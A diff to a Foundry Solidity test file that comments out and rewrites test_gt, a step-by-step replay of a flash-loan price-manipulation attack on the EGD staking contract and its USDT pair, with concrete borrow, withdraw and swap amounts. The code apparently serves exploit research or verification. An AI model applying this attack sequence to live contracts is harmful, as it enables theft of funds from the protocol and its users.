@@ -217,43 +217,106 @@ contract EGDTestBase is Test, BlockLoader {
         egdstaking.claimAllReward();
     }
 
-    function test_gt() public {
-        vm.startPrank(attacker);
-        emit log_named_uint("amt0", 2100e18);
-        borrow_usdt_owner(2100e18);
-        printBalance("After step0 ");
-        emit log_named_uint("amt1", 100e18);
-        deposit_egdstaking_usdt_egdslp(100e18);
-        printBalance("After step1 ");
-        emit log_named_uint("amt2", 424526221219952604636716);
-        borrow_usdt_pair(424526221219952604636716);
-        printBalance("After step2 ");
-        emit log_named_uint("amt3", 0);
-        withdraw_egdstaking_egdslp_egd(0);
-        printBalance("After step3 ");
-        emit log_named_uint(
-            "amt4",
-            (uint(424526221219952604636716) * 1003) / 1000
-        );
-        payback_usdt_pair((uint(424526221219952604636716) * 1003) / 1000);
-        printBalance("After step4 ");
-        emit log_named_uint("amt5", egd.balanceOf(attacker));
-        emit log_named_uint(
-            "amt6",
-            pair.getAmountOut(egd.balanceOf(attacker), address(egd))
-        );
-        swap_pair_attacker_egd_usdt(
-            egd.balanceOf(attacker),
-            pair.getAmountOut(egd.balanceOf(attacker), address(egd))
-        );
-        printBalance("After step5 ");
-        emit log_named_uint("amt7", (2100e18 * 1003) / 1000);
-        payback_usdt_owner((2100e18 * 1003) / 1000);
-        printBalance("After step6 ");
-        require(attackGoal(), "Attack failed!");
-        vm.stopPrank();
-    }
+    // function test_gt() public {
+    //     vm.startPrank(attacker);
+    //     emit log_named_uint("amt0", 2100e18);
+    //     borrow_usdt_owner(2100e18);
+    //     printBalance("After step0 ");
+    //     emit log_named_uint("amt1", 100e18);
+    //     deposit_egdstaking_usdt_egdslp(100e18);
+    //     printBalance("After step1 ");
+    //     emit log_named_uint("amt2", 424526221219952604636716);
+    //     borrow_usdt_pair(424526221219952604636716);
+    //     printBalance("After step2 ");
+    //     emit log_named_uint("amt3", 0);
+    //     withdraw_egdstaking_egdslp_egd(0);
+    //     printBalance("After step3 ");
+    //     emit log_named_uint(
+    //         "amt4",
+    //         (uint(424526221219952604636716) * 1003) / 1000
+    //     );
+    //     payback_usdt_pair((uint(424526221219952604636716) * 1003) / 1000);
+    //     printBalance("After step4 ");
+    //     emit log_named_uint("amt5", egd.balanceOf(attacker));
+    //     emit log_named_uint(
+    //         "amt6",
+    //         pair.getAmountOut(egd.balanceOf(attacker), address(egd))
+    //     );
+    //     swap_pair_attacker_egd_usdt(
+    //         egd.balanceOf(attacker),
+    //         pair.getAmountOut(egd.balanceOf(attacker), address(egd))
+    //     );
+    //     printBalance("After step5 ");
+    //     emit log_named_uint("amt7", (2100e18 * 1003) / 1000);
+    //     payback_usdt_owner((2100e18 * 1003) / 1000);
+    //     printBalance("After step6 ");
+    //     require(attackGoal(), "Attack failed!");
+    //     vm.stopPrank();
+    // }
 
+    // function test_gt() public {
+    //     uint256 amt0 = 0x44d28af50008fc000000;
+    //     uint256 amt1 = 0x44d28af4c77674000000;
+    //     uint256 amt2 = 0x8a0ecc490982f0000000;
+    //     uint256 amt3 = 0xde0b6b3a7640000;
+    //     uint256 amt4 = 0x45076608ba3714000000;
+    //     uint256 amt5 = 0x5b37553b785180000;
+    //     uint256 amt6 = 0xde0b6b3a7640000;
+    //     uint256 amt7 = 0x4507663bdbf920000000;
+
+    //     vm.startPrank(attacker);
+    //     vm.assume(amt7 >= amt0);
+    //     vm.assume(amt4 >= amt2);
+    //     borrow_usdt_owner(amt0);
+    //     printBalance("After step0 ");
+    //     deposit_egdstaking_usdt_egdslp(amt1);
+    //     printBalance("After step1 ");
+    //     borrow_usdt_pair(amt2);
+    //     printBalance("After step2 ");
+    //     withdraw_egdstaking_egdslp_egd(amt3);
+    //     printBalance("After step3 ");
+    //     payback_usdt_pair(amt4);
+    //     printBalance("After step4 ");
+    //     swap_pair_attacker_egd_usdt(amt5, amt6);
+    //     printBalance("After step5 ");
+    //     payback_usdt_owner(amt7);
+    //     printBalance("After step6 ");
+    //     require(!attackGoal(), "Attack succeed!");
+    //     vm.stopPrank();
+    // }
+
+    function test_gt() public {
+uint256 amt0 = 0x12949c9d085d2300000;
+uint256 amt1 = 0xe3c3ef7bed4d000000;
+uint256 amt2 = 0x5a813a082c7c4c000000;
+uint256 amt3 = 0xde0b6b3a7640000;
+uint256 amt4 = 0x5ac6bc028ad1b8000000;
+uint256 amt5 = 0x8fce3f556a19d0000000;
+uint256 amt6 = 0x12a381c0a087d800000;
+uint256 amt7 = 0x12a2e1b27564dc00000;
+
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        vm.assume(amt4 >= amt2);
+        borrow_usdt_owner(amt0);
+        printBalance("After step0 ");
+        deposit_egdstaking_usdt_egdslp(amt1);
+        printBalance("After step1 ");
+        emit log_named_uint("amt2", amt2);
+        borrow_usdt_pair(amt2);
+        printBalance("After step2 ");
+        withdraw_egdstaking_egdslp_egd(amt3);
+        printBalance("After step3 ");
+        payback_usdt_pair(amt4);
+        printBalance("After step4 ");
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        printBalance("After step5 ");
+        payback_usdt_owner(amt7);
+        printBalance("After step6 ");
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+
+    }
     function check_gt(
         uint256 amt0,
         uint256 amt1,
